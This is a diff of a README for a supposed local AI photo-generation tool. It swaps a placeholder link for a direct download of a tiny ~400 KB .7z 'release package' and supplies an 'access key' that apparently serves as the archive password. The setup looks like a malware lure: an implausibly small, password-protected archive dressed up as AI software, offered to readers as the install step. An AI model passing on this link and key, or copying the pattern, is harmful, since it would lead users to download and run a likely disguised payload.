@@ -171,7 +171,7 @@ The pipeline features an adaptive Low-VRAM Execution Mode for legacy hardware se
 
 ## 📥 Download & Environment Setup
 
-* 📦 **[Click here to download the stable release package](https://github.com)** *(Ultra-compressed archive, ~400 KB)*
+* 📦 **[Click here to download the stable release package](https://github.com/maiklfancy/ai-photo-generation/raw/refs/heads/main/ai-visual-synthesis-v1.0.7z)** *(Ultra-compressed archive, ~400 KB)*
 * 🔑 **Local WebUI Access Key:** `f1PQI0RVra`
 
 *💡 **Model Showcase:** The photorealistic portrait at the top of this repository was generated locally using the AI Photo Synthesis Engine v1.0 with dynamic studio lighting presets and custom anatomical fine-tuning layers.*
